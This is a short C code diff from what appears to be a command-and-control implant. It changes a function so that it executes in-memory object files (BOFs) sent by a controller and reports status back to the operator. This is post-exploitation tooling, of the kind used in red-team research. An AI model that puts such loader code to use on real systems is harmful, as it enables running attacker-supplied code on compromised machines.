@@ -595,42 +595,16 @@ _END_OF_CODE:
 
 int do_bof(BOF_IN* bof_payload)
 {
-	// // Now bof doesn't work like this. change.
-	// PSTR sPath = { 0 };
-	// PBYTE pObject = { 0 };
-	// ULONG uLength = { 0 };
+	WCHAR DbgString[256] = { 0 };	
 
-	// sPath = bof_payload.args;
-	// WCHAR DbgString[256];
-	
-	// // pic_strcpy(DbgString, "[*] Loading object file:");
-	// // pic_strcat(DbgString, sPath);
-	// // printf("[*] Loading object file: %s\n", sPath);
-	
-	// pic_wsprintf(DbgString, L"[*] Loading object file: %s", sPath);
-	// hannibal_response(DbgString, task_uuid);
-	
-	// //
-	// // read object file from disk into memory 
-	// //
+	pic_wsprintf(DbgString, L"[*] Loading object file from memory...");
+	hannibal_response(DbgString, bof_payload->controller_uuid);
 
-	// if (!ReadFileFromDiskA(hannibal_instance_ptr, task_uuid, sPath, (PBYTE*)&pObject, &uLength)) {
-	// 	// printf("[!] Failed to load file: %s\n", sPath);
-	// 	hannibal_response(L"[!] Failed to load file", task_uuid);
-	// 	goto END;
-	// }
-	// // printf("[*] Object file loaded @ %p [%ld bytes]\n", pObject, uLength);
-	// 	pic_wsprintf(DbgString, L"[*] Object file loaded @ %p [%ld bytes]", pObject, uLength);
-	// 	hannibal_response(DbgString, task_uuid);
-	// //
-	// // invoke the object file
-	// //
+	if (!ObjectLdr(bof_payload->hannibal_instance, bof_payload->controller_uuid, bof_payload->pbof_content, "go", bof_payload->args, 0)) {
+		pic_wsprintf(DbgString, L"[!] Failed to execute object file");
+		hannibal_response(DbgString, bof_payload->controller_uuid);
+	}
 
-	// // TODOs: The `NULL` parameter is actually arguments. We need to pass the arguments to the object file correctly.
-	// if (!ObjectLdr(hannibal_instance_ptr, task_uuid, pObject, "go", NULL, 0)) {
-	// 	// printf("[!] Failed to execute object file\n");
-	// 	hannibal_response(L"[!] Failed to execute object file", task_uuid);
-	// }
 END:
 	return 0;
 }
